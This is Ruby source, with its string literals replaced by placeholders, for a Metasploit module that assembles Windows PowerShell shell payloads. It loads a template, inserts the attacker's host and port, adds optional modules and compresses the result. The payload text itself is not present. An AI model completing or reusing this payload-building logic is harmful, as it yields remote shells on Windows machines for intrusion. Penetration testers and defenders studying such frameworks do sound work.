require <str> require <str> module Msf module Payload::Windows::Powershell def generate_powershell_code ( conntype ) lport = datastore [ <str> ] lhost = datastore [ <str> ] template_path = :: File . join ( Msf :: Config . data_directory , <str> , <str> , <str> ) script_in = <str> :: File . open ( template_path , <str> ) do | fd | script_in << fd . read ( fd . stat . size ) end mods = <str> if conntype == <str> script_in << <str> elsif conntype == <str> script_in << <str> end if datastore [ <str> ] mods_array = datastore [ <str> ] . to_s . split ( <str> ) mods_array . collect ( & <str> ) print_status ( <str> mods_array . count <str> ) mods_array . each { | m | vprint_good <str> m <str> } mods = <str> mods_array . join ( <str> ) <str> script_in << <str> end script_in . gsub! ( <str> , mods ) script_in . gsub! ( <str> , lport . to_s ) script_in . gsub! ( <str> , lhost . to_s ) script = Rex :: Powershell :: Command . compress_script ( script_in ) <str> script <str> end end end 
